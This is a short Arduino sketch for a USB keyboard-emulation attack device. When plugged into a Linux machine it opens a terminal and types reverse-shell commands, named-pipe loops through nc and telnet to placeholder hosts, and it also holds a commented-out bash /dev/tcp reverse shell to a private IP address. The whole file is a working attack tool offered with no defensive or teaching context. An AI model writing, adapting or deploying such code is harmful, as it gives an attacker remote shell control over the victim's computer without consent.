
# define PAYLOAD1 "mknod bp1 p && nc INPUT0 INPUT1 0<bp1 | /bin/bash 1>bp1 &"
//# define PAYLOAD2 "/bin/bash -i > /dev/tcp/192.168.1.40/8080 0<&1 2>&1 &" 
#define PAYLOAD3 "mknod bp2 p && telnet INPUT2 INPUT3 0<bp2 | /bin/bash 1>bp2 &"

void setup()
{
  Keyboard.begin();
}
void loop()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.println(F(PAYLOAD1));
  delay(2000);
  //Keyboard.println(F(PAYLOAD2));
  //delay(2000);
  Keyboard.println(F(PAYLOAD3));
  delay(2000);
  Keyboard.println(F("exit"));
  while(true);
}

void terminal()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
}

